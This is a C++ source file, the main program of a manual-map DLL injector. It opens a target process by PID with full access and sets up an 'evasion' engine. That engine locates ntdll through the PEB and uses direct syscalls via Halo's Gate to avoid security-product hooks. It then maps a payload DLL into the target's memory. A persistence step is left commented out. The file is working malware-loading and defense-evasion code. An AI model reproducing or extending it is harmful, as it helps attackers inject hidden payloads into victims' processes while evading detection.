#include <iostream>
#include <fstream>
#include <vector>
#include "core/mapper/mapper.h"
#include "techniques/evasion/hook_detector.cpp" // To call InitGhostEngine

// Helper to read the DLL from your Arch Linux drive
std::vector<uint8_t> ReadFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};
    
    size_t size = file.tellg();
    std::vector<uint8_t> buffer(size);
    file.seekg(0, std::ios::beg);
    file.read((char*)buffer.data(), size);
    return buffer;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: ./mapper.exe <PID> <Payload.dll>" << std::endl;
        return 1;
    }

    DWORD targetPid = std::stoi(argv[1]);
    std::string dllPath = argv[2];

    // 1. Initialize Evasion (Step 3)
    // Find ntdll via PEB and set up Syscall SSNs via Halo's Gate
    PVOID ntdllBase = IATResolver::GetModuleBasePEB(L"ntdll.dll");
    InitGhostEngine(ntdllBase);
    std::cout << "[+] Ghost Engine (Direct Syscalls) Ready." << std::endl;

    // 2. Load Payload into memory
    auto rawData = ReadFile(dllPath);
    if (rawData.empty()) {
        std::cerr << "[-] Failed to read DLL." << std::endl;
        return 1;
    }

    // 3. Open Target Process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProc) {
        std::cerr << "[-] Failed to open target process." << std::endl;
        return 1;
    }

    // 4. Orchestrate the Mapping (Step 4)
    std::cout << "[*] Mapping " << dllPath << " into PID " << targetPid << "..." << std::endl;
    MAP_STATUS status = ManualMap(hProc, rawData);

    if (status == MAP_STATUS::SUCCESS) {
        std::cout << "[+] Payload mapped successfully. No hooks touched." << std::endl;
        
        // 5. Persistence (Optional Step 3)
        // SetPersistence(dllPath.c_str());
    } else {
        std::cerr << "[-] Mapping failed." << std::endl;
    }

    CloseHandle(hProc);
    return 0;
}
